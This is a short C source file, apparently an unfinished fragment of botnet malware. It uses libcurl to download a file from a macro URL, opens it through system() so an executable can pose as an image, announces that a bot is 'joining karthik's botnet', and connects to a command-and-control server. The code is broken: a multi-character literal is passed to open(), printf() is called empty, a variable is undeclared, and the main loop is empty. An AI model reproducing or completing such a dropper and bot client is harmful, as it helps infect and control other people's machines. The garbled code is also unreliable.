#include <curl/curl.h>

#include "macros.h"

int main(void) {
	//download and present image using curl to operate executable as an image
	CURL *curl;
	FILE *fp;
	CURLcode res;
	char *curl_error[CURL_ERROR_SIZE];
	curl = curl_easy_init();
	if (curl) {
		fp = open(ALIAS_IMG_NAME, 'wb');
		curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, curl_error);
		curl_easy_setopt(curl, CURLOPT_URL, ALIAS_IMG_URL);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		fclose(fp);
	}
	if (res) {
		printf()
	} else {
		system("open ALIAS_IMG_NAME");
	}

	char cmd[MAX_BUF];


char  msg[MAX_BUF]; 
  int   cc_s;

  bot_id = "yonatan";
 
  printf ("'%s' joining karthik's botnet\n", bot_id);
  cc_s = bot_connect_cc (CC_SERVER, CC_PORT);


	while (true) {

	}
}